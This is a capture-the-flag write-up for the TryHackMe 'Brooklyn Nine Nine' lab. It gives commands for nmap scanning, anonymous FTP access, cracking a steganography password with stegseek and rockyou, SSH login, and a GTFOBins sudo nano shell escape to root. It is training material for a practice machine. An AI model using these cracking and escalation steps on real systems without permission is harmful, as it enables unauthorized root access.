Brooklyn Nine Nine

TryHackMe, Easy

Brooklyn Nine Nine combines an anonymous-FTP hint, steganography to obtain credentials, and privilege escalation abusing sudo nano per GTFOBins.

Reconnaissance

Nmap reveals FTP (anonymous login allowed), SSH and HTTP. A note on FTP says user jake has a weak password; the web page hides data in an image via steganography.

nmap -sS -sV <IP>
nmap -sV --script ftp-anon -p 21 <IP>
ftp <IP>   # anonymous -> note_to_jake.txt

Foothold

stegseek extracts the password embedded in the site image, used to authenticate as holt over SSH.

stegseek brooklyn99.jpg rockyou.txt
ssh holt@<IP>   # password: <PASSWORD>

Escalation - sudo nano (GTFOBins)

sudo -l shows holt may run nano as root. Via GTFOBins, we spawn a shell from the editor.

sudo -l
sudo /bin/nano
^R^X
reset; sh 1>&0 2>&0
cat /root/root.txt
